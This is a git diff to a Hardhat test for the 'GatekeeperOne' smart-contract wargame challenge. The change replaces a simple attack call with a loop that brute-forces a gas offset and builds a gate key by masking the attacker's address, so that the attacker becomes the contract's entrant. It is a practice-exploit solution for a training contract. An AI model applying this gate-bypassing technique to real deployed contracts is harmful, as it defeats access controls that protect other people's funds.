@@ -1,6 +1,6 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
-import { Contract } from 'ethers';
+import { BigNumber, Contract } from 'ethers';
 import { ethers } from 'hardhat';
 
 describe('GatekeeperOne', () => {
@@ -23,9 +23,22 @@ describe('GatekeeperOne', () => {
       contract.address
     );
 
-    const tx = await attackerContract.connect(attacker).attack();
-    await tx.wait();
+    for (let i = 0; i < 8191; i++) {
+      // console.log(i);
+      try {
+        const mask = '0xffffffff0000ffff';
+        const shortAddress = `0x${attacker.address.slice(
+          attacker.address.length - 16,
+          attacker.address.length
+        )}`;
+        const gateKey = BigNumber.from(shortAddress).and(mask);
 
-    expect(await contract.entrant()).to.equal(attacker.address);
+        const tx = await attackerContract.enter(i, BigNumber.from(gateKey));
+        await tx.wait();
+        break;
+      } catch (err) {}
+    }
+
+    expect(await contract.entrant()).to.eq(attacker.address);
   });
 });
